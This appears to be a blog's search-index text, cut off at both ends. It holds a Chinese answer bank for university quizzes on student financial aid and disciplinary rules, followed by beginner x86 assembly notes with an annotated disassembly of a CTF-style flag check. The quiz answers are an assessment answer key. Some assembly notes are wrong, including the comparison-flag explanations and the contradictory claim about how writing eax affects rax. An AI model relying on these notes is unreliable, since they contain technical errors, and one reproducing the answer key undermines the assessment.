)。A. 负责向经办银行提供贷款学生的变动情况(包括出国、转学、休学、退学、开除、伤亡、失踪等)B. 协助经办银行管理国家助学贷款的发放、使用与归还C. 学生处私自依据学生的品德优劣、学习成绩上报D. 在学生毕业、转学、升学等变动情况发生前协助经办银行办理学生借款的重新确认或变更合同;正确答案: C\n7.(单选题, 1.0 分)各学院助学金评定工作领导小组严格按照申请条件对名单中所列学生进行资格审查,初步确定享受浙江师范大学助学金的学生名单,并在全院范围内公示不少于()个工作日。A. 1B. 2C. 3D. 4正确答案: C\n8.(单选题, 1.0 分)国家助学金分为( )档。A. 2B. 3C. 4D. 5正确答案: A\n9.(单选题, 1.0 分)同一学年内,申请国家励志奖学金的家庭经济困难学生可同时申请并获得国家助学金,但不能同时获得( )。A. 国家奖学金B. 校励志奖学金C. 省政府奖学金D. 以上都是正确答案: D\n10.(单选题, 1.0 分)以下哪项不属于减免程序?( )A. 个人申请B. 班级评议C. 学校审核正确答案: C\n11.(单选题, 1.0 分)有关“迎新启梦”助学金资助程序正确的选项为( )。A. 个人申请-学校批准-学院审核-发放助学金B. 学院审核-学校批准-个人申请-发放助学金C. 个人申请-学院审核-学校批准-发放助学金D. 学院审核-个人申请-学校批准-发放助学金正确答案: C\n12.(单选题, 1.0 分)网上办事大厅个人信息处不可以填的银行( )A. 中国银行B. 中国农业银行C. 中国工商银行D. 中国建设银行正确答案: D\n13.(单选题, 1.0 分)就学地国家助学贷款的申请时间而言新生申请的时间是( )月份、高年级申请的时间是( )月份。A. 3 12B. 11 4C. 6 9D. 1 8正确答案: B\n14.(单选题, 1.0 分)校励志奖学金的基本申请条件之一为上学年基本评价在班级前( )%(含)。A. 50B. 20C. 35D. 25正确答案: A\n15.(单选题, 1.0 分)浙江师范大学学生资助对象科研训练资助项目可申请立项的群体为( )A. 浙江师范大学全日制非毕业班本(专)科家庭经济困难学生B. 浙江师范大学全日制本(专)科家庭经济困难学生C. 浙江师范大学全日制本科家庭经济困难学生D. 浙江师范大学非毕业班本(专)科家庭经济困难学生正确答案: A\n16.(单选题, 1.0 分)国家助学贷款是按国家助学贷款的有关规定和()实施。A. 《浙江师范大学学生国家助学贷款实施办法》B. 《浙江师范大学学生资助对象认定办法》C. 《浙江师范大学学生勤工助学管理办法》D. 《浙江师范大学学生学费减免实施办法》正确答案: A\n17.(单选题, 1.0 分)国家助学贷款是国家为实施( ),加速人才培养,资助经济困难学生顺利完成学业而实行的一种助学政策。A. 科教兴国战略B. 可持续发展战略C. 一带一路战略D. 人才强国战略正确答案: A\n18.(单选题, 1.0 分)学校设立( ),用于家庭经济困难学生教育实践项目等教育活动,为家庭经济困难学生了解社会、回报社会,锻炼组织和实践能力搭建平台。A. 家庭经济困难学生教育经费B. 家庭经济困难学生教育专项经费C. 家庭经济困难学生思想教育专项经费D. 家庭经济困难学生社会实践专项经费正确答案: C\n19.(单选题, 1.0 分)各学院成立由分管学生工作的_____任组长,______、______为成员的学院学费减免工作领导小组,具体负责本学院学生学费减免工作。( )A. 院领导 学生工作办公室成员 班主任代表B. 班主任代表 院领导 学生工作办公室成员C. 学生工作办公室成员 院领导 班主任代表正确答案: A\n20.(单选题, 1.0 分)就学地国家助学贷款的管理中借款学生所在的学院要积极配合学生处,做好借款学生( )和变动情况信息通报的基础工作。A. 家庭经济情况B. 学习成绩C. 学业情况D. 资格初审正确答案: D\n21.(单选题, 1.0 分)国家助学金主要用于资助家庭经济困难学生的( )。A. 生活费用B. 学费C. 伙食费D. 住宿费正确答案: A\n22.(单选题, 1.0 分)浙江师范大学学生资助对象科研训练资助项目立项条件包括其中负责人_____名,参与者_____人。( )A. 1;1-4B. 1;1-5C. 1;2-4D. 1;2-5正确答案: D\n23.(单选题, 1.0 分)资助家庭经济困难学生顺利完成学业,是全面贯彻习近平总书记系列重要讲话精神和( )新理念新思想新战略的必然要求A. 治国理政B. 为人民服务C. 依法治国D. 共同富裕正确答案: A\n24.(单选题, 1.0 分)学校和各学院要加强学生的( )教育,要求学生如实提供家庭情况,并及时告知家庭经济状况显著变化等情况。A. 素质B. 诚信C. 道德D. 职业正确答案: B\n25.(单选题, 1.0 分)浙江师范大学坚持公开、公平、公正和集体决定的原则,学生助学金每学年评定()次。A. 1B. 2C. 3D. 4正确答案: A\n26.(单选题, 1.0 分)符合下列情况之一的,可认定为B类资助对象( )A. 家庭劳动力不足,但有稳定收入来源,家庭收入不能维持正常学习和生活的学生B. 学生本人或直接供养人患重大疾病需支付大额医疗费用,导致家庭经济特别困难的C. 其它经济困难的。正确答案: C\n27.(单选题, 1.0 分)学习成绩优秀,上学年基本评价在班级前( )。A. 30%B. 30%(含)C. 35%D. 35%(含)正确答案: D\n28.(单选题, 1.0 分)浙江师范大学学生资助对象科研训练资助项目中优秀项目总资助经费为____元,并参照校级科研项目在学生综合素质评价中予以加分;合格项目总资助经费为____元。( )A. 1000;600B. 800;600C. 1000;500D. 800;500正确答案: C\n29.(单选题, 1.0 分)浙江师范大学助学金评审程序是()。 ①学院评选 ②班级评议 ③学校审定 ④学校公示 ⑤学生处(校学生资助管理中心)审查A. ①②③④⑤B. ①②⑤④③C. ②①⑤③④D. ②①③④⑤正确答案: C\n30.(单选题, 1.0 分)学校将国家励志奖学金( )发放给获奖学生,并记入学生学籍档案。A. 一次性B. 分两次C. 不定期D. 定期正确答案: A\n31.(单选题, 1.0 分)根据浙江师范大学学生资助对象科研训练资助项目结题成绩,各学院以不超过本学院项目总数的____推荐上报优秀项目,校评审委员将以全校项目总数的____左右确定优秀项目。被学院推荐到学校的项目没有评为优秀的,自动降为合格等级。( )A. 30%;20%B. 40%;20%C. 30%;15%D. 40%;15%正确答案: A\n32.(单选题, 1.0 分)要将国家助学金的发放与家庭经济困难学生认定工作相结合,认真核实家庭经济困难学生的经济状况,准确确定补助对象,坚决杜绝( )。A. 形式主义B. 精英主义C. 决对平均主义D. 平均主义正确答案: D\n33.(单选题, 1.0 分)“迎新启梦”助学金共设三档,一档资助金额( )元、二档资助金额()元、三档资助金额()元。A. 2500 1500 1000B. 2000 1000 500C. 1500 1000 500D. 1000 600 200正确答案: B\n34.(单选题, 1.0 分)国家助学金用于资助( )。A. 成绩优异的在校全日制本专科学生B. 学习勤奋的在校全日制本专科学生C. 品德高尚的在校全日制本专科学生D. 家庭经济困难的在校全日制本专科学生正确答案: D\n35.(单选题, 1.0 分)请选出不符合“迎新启梦”助学金二档资助条件的选项( )。A. 重度残疾或残疾家庭且家庭经济困难的学生;B. 非特困残疾学生(有《残疾证》)C. 由社会福利机构监护的学生;D. 列入农村五保户家庭的子女;正确答案: B\n36.(单选题, 1.0 分)勤工助学采用组织安排与公开招聘相结合的办法,按照“双向选择、择优录用”的原则,优先录用经济困难学生。校内固定勤工助学岗位原则上保证( )以上提供给家庭经济困难学生。A. 30%B. 40%C. 50%D. 60%正确答案: D\n37.(多选题, 2.0 分)浙江师范大学学生资助对象科研训练资助项目中申报项目应具有( )A. 可行性B. 实用性C. 实践性D. 创新性正确答案: ABD\n38.(多选题, 2.0 分)对已获奖学金的学生,凡发现有材料虚假、欺骗组织等行为,学校将对该学生进行( )处罚。A. 撤销所得奖项B. 追缴已发奖金C. 按规定严肃处理D. 劝退正确答案: ABC\n39.(多选题, 2.0 分)有下列情况之一者,暂停国家助学金发放( )A. 违法违纪受到学校处分者B. 发生学籍异动者C. 隐瞒家庭经济实际情况者D. 家庭经济状况明显好转足以支付其在校期间生活费者E. 转专业者正确答案: ABCD\n40.(多选题, 2.0 分)有下列情况之一的学生,学校不给予补助。( )A. 由于自身责任造成被盗、火灾等而展示生活困难的B. 平时有抽烟、酗酒、频换手机等普铺张浪费行为的C. 受纪律处分的和休学或延长学习年限的。正确答案: ABC\n41.(多选题, 2.0 分)临时困难补助申请条件。( )A. 学生本人遭遇重大意外身体伤害事故或突发急重病症住院,所需治疗费用较大,个人负担部分超出学生及其家庭支付能力的B. 学生供养人发生重大疾病、突然亡故等或因自然灾害使家庭经济遭受重大损失,致使学生经济来源发生困难的C. 申请对象为浙江师范大学本学年认证通过的家庭经济困难学生D. 非本人原因致使个人财务遭受较大损失而影响基本生活的。正确答案: ABD\n42.(多选题, 2.0 分)凡中途撤项、无故延期且无具体改进措施、答辩未过或经费使用不当的资助项目,( )A. 学生处(校学生资助管理中心)或学院可责令项目负责人停止使用项目经费B. 学生处(校学生资助管理中心)或学院可视情节轻重收回部分或全部资助资金C. 项目负责人不得申报下一年度项目D. 项目负责人不得申报下两年度项目正确答案: ABC\n43.(多选题, 2.0 分)国家助学金的基本申请条件包括( )A. 热爱社会主义祖国,拥护中国共产党的领导B. 自觉遵守宪法和法律,遵守学校规章制度C. 诚实守信,乐于助人,道德品质优良D. 勤奋学习,积极上进E. 家庭经济困难,生活俭朴正确答案: ABCDE\n44.(多选题, 2.0 分)符合下列情况之一的,可认定为B类资助对象的有( )。A. 家庭劳动力不足,无稳定收入来源,家庭收入不能维持正常学习和生活的学生B. 因突发事件及因灾、因病造成家庭经济困难的学生C. 其它特殊经济困难的D. 学生本人或直接供养人患重大疾病需支付大额医疗费用,导致家庭经济特别困难的E. 特困供养学生、孤儿、烈士子女、持证残疾学生等正确答案: AB\n45.(多选题, 2.0 分)家庭经济困难学生可以通过( ).各类助学金、困难补助等渠道获得保障性资助,也可以通过申请相关项目获得发展性资助。A. 国家助学贷款B. 勤工助学C. 奖学金D. 学费减免E. 绿色通道正确答案: ABCDE\n46.(多选题, 2.0 分)符合下列情况之一的,可认定为A类资助对象的有( )。A. 家庭劳动力不足,无稳定收入来源,家庭收入不能维持正常学习和生活的学生B. 学生本人或直接供养人患重大疾病需支付大额医疗费用,导致家庭经济特别困难的C. 其它经济困难的D. 特困供养学生、孤儿、烈士子女、持证残疾学生等E. 因突发事件及因灾.因病造成家庭经济困难的学生正确答案: BD\n47.(多选题, 2.0 分)浙江师范大学助学金按月发放到受助学生手中,有( )情况之一者,暂停助学金发放。A. 违法违纪受到学校处分者;B. 发生学籍异动者;C. 隐瞒家庭经济实际情况者;D. 家庭经济状况明显好转足以支付其在校期间生活费者;E. 平时生活中有不合理开支者。正确答案: ABCDE\n48.(多选题, 2.0 分)“迎新启梦”助学金资助条件是( )。A. 热爱社会主义祖国,拥护中国共产党的领导B. 自觉遵守宪法和法律,遵守学校各项规章制度C. 诚实守信,道德品质优良D. 家庭经济特别困难,生活俭朴正确答案: ABCD\n49.(多选题, 2.0 分)以下属于学地国家助学贷款发放的程序的是( )。A. 学生通过银行进行申请并向银行递交表格和相关材料B. 学院对学生贷款资格进行审查、签署意见并组织学生签订借款合同,填写借款凭证C. 学生处(校学生资助管理中心)审核后,相对集中时间将有关材料报送经办银行D. 经办银行把贷款金额划入学校帐户,学校先抵扣学费,余额存入贷款学生缴费卡正确答案: BCD\n\n4.违纪处分篇\n1.(单选题, 1.0 分)在学校内穿戴宗教服饰、进行宗教或迷信活动,经劝阻无效的,视情节轻重,给予( )至( )处分。A. 警告 严重警告B. 警告 留校察看C. 严重警告 记过D. 留校察看 开除学籍正确答案: B\n2.(单选题, 1.0 分)组织、策划和参与扰乱社会秩序或破坏学校正常的教学、科研、生活秩序,从事破坏安定团结的活动。视情节严重和悔改态度,给予( )直至( )处分。A. 警告 严重警告B. 严重警告 记过C. 严重警告 开除学籍D. 记过 开除学籍正确答案: D\n3.(单选题, 1.0 分)伪造、涂改、转借证件或材料,或假冒身份实施欺骗行为者,视情节和后果给予( )至( )处分。A. 警告 严重警告B. 警告 留校察看C. 留校察看 开除学籍D. 记过 开除学籍正确答案: B\n4.(单选题, 1.0 分)学生一学期内旷课累计满10学时的,给予( )处分。A. 警告B. 记过C. 严重警告D. 留校察看正确答案: A\n5.(单选题, 1.0 分)处分期最长不得超过( )。A. 3个月B. 6个月C. 9个月D. 12个月正确答案: D\n6.(单选题, 1.0 分)注销浙江师范大学学籍的,处分( )解除。A. 不得B. 同时C. 到处分期限结束正确答案: B\n7.(单选题, 1.0 分)通过抢夺、盗窃、勒索、诈骗、侵占等手段非法占有国家、集体和他人财物者,除追回赃款、赃物或赔偿损失外,3000元（含）以上的,视其情节,给予( )至( )处分。A. 警告 严重警告B. 严重警告 留校察看C. 留校察看 开除学籍D. 记过 开除学籍正确答案: C\n8.(单选题, 1.0 分)殴打他人或互殴,致他人轻微伤者,给予( )至( )处分。A. 警告 严重警告B. 严重警告 记过C. 记过 留校察看D. 记过 开除学籍正确答案: C\n9.(单选题, 1.0 分)处分送达书文本一式( )份A. 一B. 两C. 三D. 四正确答案: D\n10.(单选题, 1.0 分)扰乱宿舍管理秩序,对其他人的正常学习、生活造成影响,经劝说、批评、教育不改者,视其情节,给予()至()处分;情节特别严重的,给予()处分。A. 警告 严重警告 留校察看B. 严重警告 记过 留校察看C. 警告 留校察看 开除学籍D. 记过 严重警告 开除学籍正确答案: C\n11.(单选题, 1.0 分)在学生宿舍内饲养宠物等,经劝告或批评教育仍不改正者,视其情节,给予( )至( )处分;造成不良后果的,视其情节,给予( )至( )处分。A. 警告 严重警告 记过 留校察看B. 警告 严重警告 留校察看 开除学籍C. 警告 留校察看 记过 开除学籍D. 警告 记过 严重警告 开除学籍正确答案: A\n12.(单选题, 1.0 分)通过抢夺、盗窃、勒索、诈骗、侵占等手段非法占有国家、集体和他人财物者,除追回赃款、赃物或赔偿损失外,案值不满3000元者,视其情节,给予( )至( )处分。A. 警告 严重警告B. 严重警告 留校察看C. 留校察看 开除学籍D. 记过 开除学籍正确答案: B\n13.(单选题, 1.0 分)学生一学期内旷课累计满30学时的,给予( )处分。A. 警告B. 记过C. 严重警告D. 留校察看正确答案: B\n14.(单选题, 1.0 分)严重警告处分期限时间为( )。A. 3个月B. 6个月C. 9个月D. 12个月正确答案: B\n15.(单选题, 1.0 分)学生在警告、严重警告或记过处分期限内受到新的处分的,其处分期限内受到新的处分的,其处分期为( )。A. 原处分期尚未执行的期限B. 新处分期限C. 原处分期尚未执行的期限与新处分期限之和D. 原处分期尚未执行的期限与新处分期限之差正确答案: C\n16.(单选题, 1.0 分)记过处分期限时间为( )。A. 3个月B. 6个月C. 9个月D. 12个月正确答案: C\n17.(单选题, 1.0 分)一人有数项性质不同的违纪行为被同时处理的,或同一违纪行为同时触犯多项纪律条款的,在对各项违纪事实进行逐一认定的基础上,选择( )进行处分。A. 叠加处分B. 应收处分类别中最重C. 应收处分类别中最轻正确答案: B\n18.(单选题, 1.0 分)发生在假期的违纪违规行为,一般应在( )处理结束。A. 下一学期初B. 下一学期结束前C. 下一学期期中前正确答案: A\n19.(单选题, 1.0 分)学生如对处分决定有异议,可在接到学校处分决定书送达之日起( )内向学生申诉处理委员会提出书面申诉。A. 7日B. 10日C. 15日D. 20日正确答案: B\n20.(单选题, 1.0 分)未请假离校连续( )未参加学校规定的教学活动而予以退学的,不再给予纪律处分。A. 一周B. 15天C. 两周D. 一个月正确答案: C\n21.(单选题, 1.0 分)偷窃公章、保密文件、档案或其他密级物品者,视其情节,给予( )处分。A. 严重警告B. 记过C. 留校察看D. 开除学籍正确答案: C\n22.(单选题, 1.0 分)弄虚作假,骗取各类荣誉、资格、校(院)奖学金、助学金、困难补助、国家助学贷款者,视其情节,给予( )至( )处分。A. 警告 严重警告B. 记过 开除学籍C. 警告 留校察看D. 留校察看 开除学籍正确答案: C\n23.(单选题, 1.0 分)学生申诉处理委员会对学生提出的申诉进行复查,并在接到书面申诉之日起( )日内,作出复查结论并告知申诉人。A. 7日B. 10日C. 15日D. 20日正确答案: C\n24.(单选题, 1.0 分)浙江师范大学学生违纪处分规定考试 警告处分期限时间为( )。A. 3个月B. 6个月C. 9个月D. 12个月正确答案: B\n25.(单选题, 1.0 分)违纪通知书、处分决定以及处分送达书等,自发出公告之日起,经过( )日,即视为送达。A. 30B. 60C. 90D. 120正确答案: B\n26.(单选题, 1.0 分)盗用他人(含单位)网络账号或各类通讯卡账号和密码并使用者,造成损失的,视其情节,给予( )至( )处分。A. 警告 严重警告B. 严重警告 留校察看C. 留校察看 开除学籍D. 记过 开除学籍正确答案: B\n27.(单选题, 1.0 分)学生有违反校纪校规的行为,但情节轻微不足以给予纪律处分的,学校或学生所在学院应给予( ),督促其改正错误。A. 谈话教育B. 惩罚C. 公示D. 批评教育正确答案: D\n28.(单选题, 1.0 分)处理、处分或者复查决定书未告知学生申诉权利和期限的,申诉期限自学生知道或者应当知道处理或者处分决定之日起计算,但最长不得超过( )个月。A. 3B. 6C. 9D. 12正确答案: B\n29.(单选题, 1.0 分)考试作弊的,给予( )处分。A. 警告B. 记过C. 严重警告D. 留校察看正确答案: B\n30.(单选题, 1.0 分)殴打他人或互殴,致他人重伤或死亡构成犯罪的,给予( )处分。A. 严重警告B. 记过C. 留校察看D. 开除学籍正确答案: D\n31.(单选题, 1.0 分)解除处分后,学生获得表彰、奖励及其他权益,仍受原处分影响。A. 正确B. 错误正确答案: B\n32.(单选题, 1.0 分)殴打他人或互殴,尚未致伤者,给予( )处分。A. 警告B. 严重警告C. 记过D. 留校察看正确答案: B\n33.(单选题, 1.0 分)策划、怂恿、教唆、用言辞侮辱或以其他方式挑衅、触犯他人,引起事端或激化矛盾,未造成打架后果者,给予( )处分;造成打击后果者,给予( )至( )处分。A. 警告 严重警告 留校察看B. 严重警告 记过 留校察看C. 记过 留校察看 开除学籍D. 记过 严重警告 开除学籍正确答案: B\n34.(多选题, 2.0 分)无理取闹、拒绝或阻碍工作人员依法或依规执行公务者,视其情节,给予( )至( )处分。A. 警告B. 记过C. 严重警告D. 留校察看正确答案: CD\n35.(多选题, 2.0 分)处分决定书的内容包括( )A. 学生的基本信息B. 作出处分的事实C. 处分的种类D. 处分的依据正确答案: ABCD\n36.(多选题, 2.0 分)违反学术纪律者,经学校或学院学术委员会认定,视不同情况给予下列处分:有以下行为之一者,视情节轻重,给予记过直至开除学籍处分:A. 在公开发表作品中,剽窃、抄袭、侵占他人作品的内容与文字;篡改他人作品据为己有;不加注明使用他人成果的。B. 在没有参与创作的作品中署名;偷换署名或通过不正当手段改动署名顺序;未经他人同意将合作的研究成果私自发表、公布或转让的。C. 填报、提供虚假的学术成果;伪造、变造专家意见、证书或其他证明学术能力材料的D. 在进行科学研究及撰写论文、报告中,有弄虚作假 (如伪造科研数据、资料、文献、注释,或者捏造事实、编造虚假研究成果等),或以抄袭等手段剽窃他人成果的。正确答案: ABCD\n37.(多选题, 2.0 分)违章用电、用火或违规使用电器,未造成不良后果的,发现1次给予( );累计2次给予( )。A. 通报批评B. 警告处分C. 严重警告处分D. 记过处分正确答案: AC\n38.(多选题, 2.0 分)学生处分未解除前,( )。A. 不得评定奖学金、各种荣誉称号B. 不允许上课C. 限制其它应限制的权益D. 停发学业(专业)奖学金正确答案: ACD\n39.(多选题, 2.0 分)学生受处分期限内表现良好,期满后,( ),可按期解除。A. 本人申请B. 学院考察审核C. 辅导员谈话D. 学校批准同意正确答案: ABD\n40.(多选题, 2.0 分)考试严重作弊的,视情节严重,给予( )直至( )处分。A. 开除学籍B. 记过C. 严重警告D. 留校察看正确答案: AD\n41.(多选题, 2.0 分)学生在留校察看处分期限内违纪的,应当( )A. 撤销留校察看处分B. 给予开除学籍处分C. 叠加开除学籍处分D. 延长处分期正确答案: AB\n42.(多选题, 2.0 分)处理学生违纪必须有充分的证据进行合理证明,下列( )经查证属实的均为有效证据:A. 违纪学生的自我陈述、检讨书等B. 专门机构的鉴定意见C. 被侵害人签名的陈述、检举材料等D. 证人签名的证言正确答案: ABCD\n43.(多选题, 2.0 分)对有违反法律法规、本规定以及学校纪律行为的学生,学校应给予批评教育,并视情节轻重,给予下列纪律处分:A. 警告B. 严重警告C. 记过D. 留校察看E. 开除学籍正确答案: ABCDE\n44.(多选题, 2.0 分)散布谣言或故意捏造事实,作虚假陈述,混淆事实、制造混乱等,视其情节,( )至( )处分。A. 警告B. 记过C. 严重警告D. 留校察看正确答案: AD\n45.(多选题, 2.0 分)有此行为“故意夸大研究成果的科技含量、经济价值和社会影响,且已造成不良后果的”视情节轻重,给予( )直至( )处分:A. 警告B. 记过C. 严重警告D. 留校察看正确答案: AD\n46.(多选题, 2.0 分)发生性骚扰、偷窥偷拍异性隐私等不轨行为或以其他方式严重骚扰他人正常生活、学习者,视情节轻重,给予( )至( )处分。A. 警告B. 记过C. 严重警告D. 留校察看正确答案: CD\n47.(多选题, 2.0 分)违反考场纪律的,给予( )或( )处分。A. 警告B. 记过C. 严重警告D. 留校察看正确答案: AC\n48.(多选题, 2.0 分)恶意拨打特种紧急电话及学校急用值班电话者,视其情节,给予( )至( )处分。A. 开除学籍B. 记过C. 严重警告D. 留校察看正确答案: CD\n","categories":["工具"],"tags":["生活,工具"]},{"title":"x86汇编语言初步学习","url":"/2024/11/02/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0/","content":"汇编指令编基础通用寄存器\nEAX：（针对操作数和结果数据的）累加器(Accumulator)\nEBX：（DS段的数据指针）基址寄存器(Base Register)\nECX：（字符串和循环操作的）计数器(Count Register)\nEDX：（I&#x2F;O指针）数据寄存器(Data Register)\n\n用作内存指针的特殊寄存器\nESI：（字符串操作源指针）源变址寄存器\nEDI：（字符串操作目标指针）目的变址寄存器\nEBP：（SS段中栈内数据指针）扩展基址指针寄存器，即栈底指针寄存器，与rbp相同\nESP：栈顶指针寄存器与rsp相同\n\n段寄存器\nCS：代码段寄存器(code s)\nSS：栈段寄存器(stack s)\nDS：数据段寄存器(data s)\nFS：数据段寄存器\nES：附加数据寄存器\nGS：数据段寄存器\n对段寄存器的理解\n\n\n\n段寄存器就是存储一个代码段开头的一部分，可以理解为一个内存被分为了多个块，而段寄存器记录的就是一个段的开头。段寄存器一般与IP一起用，IP可以认为时一个偏移量，与段寄存器一起使用可以寻找段内的具体内存,例如ce &#x3D; e8000,ip&#x3D;ef,cs:ip&#x3D;e80ef,即CS:IP就是一个内存中的具体地址，指向的是cpu即将执行的地址。还会和jmp一起使用，用于使cpu读取其他地方的数据 \n\n程序状态与控制寄存器\nEFLAGS：标志寄存器，32个位元的01控制\nZF(零标志器，运算结果为0时置1)\nCF(进位标志，运算结果向最高位以上进位时置1)\nOF(溢出标志)，如果运算结果有溢出，那么值为1\nAF(辅助进位标志，运算结果在第3位的时候置1)\nSF(符号标志，有符号整型的符号位为1时置1)，正数为0，负数为1\n\n指令指针寄存器\nEIP &#x2F; RIP：保存CPU要执行的指令地址\n\nr与e的差别\nrax 是 64 位寄存器，能够存储 64 位（8 字节）的数据。  \neax 是 rax 的低 32 位部分，能够存储 32 位（4 字节）的数据在某些情况下，使用 eax 只会影响低 32 位数据，而高 32 位将保持不变。\n其他的如rbp和ebp就是64位和32位的区别\n\n例如，执行 mov eax, 1 会将 rax 的低 32 位设置为 1，而高 32 位会被设置为 0。rax 通常用于需要完整 64 位数据的操作，特别是在调用函数和处理返回值时。在eax赋值给rax时只会赋值在低位，高位还会时原来rax的高位，例如0xffffffff&lt;–0x1111 &#x3D;&#x3D;&gt; 0xffff1111\n常用指令\ncdqe 用于拓展eax的值为更高位32位拓展为rax，64位\n\nPUSH&#x2F;POP：压栈&#x2F;出栈\n\nPUSHA&#x2F;POPA 、 PUSHAD&#x2F;POPAD\n\nMOV&#x2F;CALL&#x2F;RET&#x2F;LEA&#x2F;INT&#x2F;EMD：传送 &#x2F; 调用 &#x2F; 返回 &#x2F; 加载 &#x2F; 中断 &#x2F; 结束\n\nCMP&#x2F;TEST：比较&#x2F;测试（结果丢弃，只修改标志位寄存器）\n\nJMP系列跳转指令\n\nADD&#x2F;SUB&#x2F;SHL&#x2F;SHR(sar)&#x2F;ROL&#x2F;ROR：加 &#x2F; 减 &#x2F; 逻辑左移 &#x2F; 逻辑右移 &#x2F; 循环左移 &#x2F; 循环右移\n\nINC&#x2F;DEC ：加一 &#x2F; 减一\n\nMUL&#x2F;IMUL：无符号乘法、整数乘法\n\nDIV&#x2F;IDIV：无符号除法、整数除法\n\nAND&#x2F;XOR&#x2F;OR&#x2F;NOT：与 &#x2F; 异或 &#x2F; 或 &#x2F; 取反\n\nmovesx 有符号拓展，把要赋值的值进行有符号拓展成更多位，如果原来的值为负数，那么拓展的高位会补1，例如0xffff(负数)–&gt;0xffffffff\n\nmovezx 无符号拓展，把要赋值的值拓展成更多位，高为补0；例如0xffff–&gt;0x0000ffff\n\nbyte ptr：表示操作的数据类型是字节\n\nrep stosd 会重复执行 stosd 指令，ecx 寄存器中的值决定了重复次数。每次执行 stosd，它会将 eax 中的值存储到 edi 寄存器指向的地址，并将 edi 加 4（指向下一个双字位置）。然后 ecx 会减 1，直到 ecx 为 0。\n\n\nlea获取的差别lea rax, [rbp+Str] 中的str是一个偏移量，由栈底的地址加偏移量获取str的地址lea rax, Str 中的str是一个地址，需要str被全局定义或再数据段中被定义\n比较操作\n在cmp操作中，有cmp ax,bx其实cmp的操作就是ax-bx,当这个操作为0，即ax&#x3D;&#x3D;bx时zf(zero flag)就会被标志为1,反之为1.下面这些参考就行如果（ax）&#x3D;（bx）则（ax）-（bx）&#x3D; 0，所以：zf &#x3D; 1如果（ax）!&#x3D;（bx）则 （ax）-（bx）!&#x3D; 0，所以：zf !&#x3D; 1；如果（ax）&lt;（bx）则（ax）-（bx）将产生借位，所以：cf &#x3D; 1；如果（ax）&gt;&#x3D;（bx）则（ax）-（bx）将不会产生借位，所以：cf &#x3D; 0；如果（ax）&gt;（bx）则（ax）-（bx）即不借位，结果又不为零，所以：cf &#x3D; 0，zf &#x3D; 0；如果（ax）&lt;&#x3D;（bx）则（ax）-（bx）即可能借位，结果可能为0，所以：cf &#x3D; 1，zf &#x3D; 1；\n\n\nINC 自增1   increase\nDEC 自减1  decrease\nJGE 前&gt;&#x3D;后  Jump if  greater or equal\nJG 前&gt;后   Jump if  greater\nJLE 前&lt;&#x3D;后  Jump if  less or equal\nJL 前&lt;后  Jump if  less\nJNE 前不等于后  Jump if not equal\nJE 前等于后  Jump if equal\nJZ，JE，jnz，jne 通过判断zf的值进行跳转\n\n栈帧栈帧就是函数在内存中的一个执行空间，里面存储着函数的信息\nPUSH EBP          ;函数开始MOV  EBP,ESP      ;将栈顶地址存入EBP中....              ;函数执行，期间EBP地址不变MOV  ESP,EBP      ;基准点地址给到ESPPOP EBP           ;栈状态恢复，弹出EBPRETN              ;\n\n\nida汇编分析\n\n.text:0000000000401550                 push    rbp         ;栈中压入rbp.text:0000000000401551                 mov     rbp, rsp    ;记录栈底指针.text:0000000000401554                 sub     rsp, 90h    ;栈顶地址减去90h，即规定栈顶地址，规划栈帧.text:000000000040155B                 call    __main      ;调用函数.text:0000000000401560                 lea     rcx, Buffer  ; &quot;input your flag:&quot;   ;加载字符串到rcx.text:0000000000401567                 call    puts         ;调用函数输出字符串.text:000000000040156C                 lea     rax, [rbp+Str]  ;加载一段缓冲区，并把地址加载到rax。这里的str为一个偏移量，那么[rbp+Str]指向的就是栈内的str的开始地址.text:0000000000401570                 mov     rdx, rax       ;把rax的地址转到rdx中.text:0000000000401573                 lea     rcx, Format     ; &quot;%s&quot;，获取输入类型到rcx.text:000000000040157A                 call    scanf         ;调用函数输入.text:000000000040157F                 lea     rax, [rbp+Str]  ;再次加载str的缓冲区.text:0000000000401583                 mov     rcx, rax        ; Str，把str的地址加载到rax.text:0000000000401586                 call    strlen         ;调用strlen函数获取str的长度.text:000000000040158B                 cmp     rax, 23h       ; 比较str的长度.text:000000000040158F                 jz      short loc_40159B ;根据返回zf值进行跳转.text:0000000000401591                 mov     eax, 0        ;如果没有跳转那么把返回值设为0，以表示函数返回.text:0000000000401596                 jmp     loc_40162B     ;跳转到末尾.text:000000000040159B ; ---------------------------------------------------------------------------.text:000000000040159B.text:000000000040159B loc_40159B:                             ; CODE XREF: main+3F↑j.text:000000000040159B                 mov     [rbp+var_4], 0 ;[rbp+var_4]即是var_4的开始地址，并把0赋值给var_4.text:00000000004015A2.text:00000000004015A2 loc_4015A2:                             ; CODE XREF: main+C8↓j.text:00000000004015A2                 cmp     [rbp+var_4], 22h ; 这里判断var_4的值是不是等于22h，根据下文了解，估计是一个循环计数器.text:00000000004015A6                 jg      short loc_40161A ;如果var_4&gt;34,那么跳转到40161A，输出正确，推测下面代码存在检测，如果检测失败，那么就会跳转到错误。.text:00000000004015A8                 mov     eax, [rbp+var_4] ;把var_4的值存入eax.text:00000000004015AB                 cdqe                     ;把eax拓展成rax.text:00000000004015AD                 movzx   eax, [rbp+rax+Str] ;[rbp+rax+Str]可以理解成rbp栈底的地址加上str的索引再加上rax的偏移值，那么就是str[rax].text:00000000004015B2                 xor     eax, 52h          ;把eax的值与52h进行异或，异或的结果会存为eax中.text:00000000004015B5                 mov     edx, eax          ;把eax中的值赋值给edx.text:00000000004015B7                 mov     eax, [rbp+var_4]  ;把Var_4的值赋值给eax,根据下面来看，是要把eax拓展成rax然后作为str的索引.text:00000000004015BA                 cdqe                      ;把eax拓展成rax.text:00000000004015BC                 mov     [rbp+rax+Str], dl  ;把str[rax]赋值为dl,dl就是edx_low即是edx的低八位(一个字符),由上面可知此时的dl为异或后的数据.text:00000000004015C0                 mov     eax, [rbp+var_4]  ;把var_4的值赋值给eax.text:00000000004015C3                 cdqe                      ;老样子.text:00000000004015C5                 movzx   eax, [rbp+rax+Str] ;把str[rax]赋值给eax,并无符号拓展(unsigned char).text:00000000004015CA                 add     eax, 5             ;把eax加上5，即str[rax]+5.text:00000000004015CD                 mov     edx, eax           ;把处理后的值保存到edx.text:00000000004015CF                 mov     eax, [rbp+var_4]   ;再获取var_4的值到eax.text:00000000004015D2                 cdqe                       ;继续拓展为rax.text:00000000004015D4                 mov     [rbp+rax+Str], dl   ;赋值edx的低八位给str[rax],即把加5后的str[rax重新赋值].text:00000000004015D8                 mov   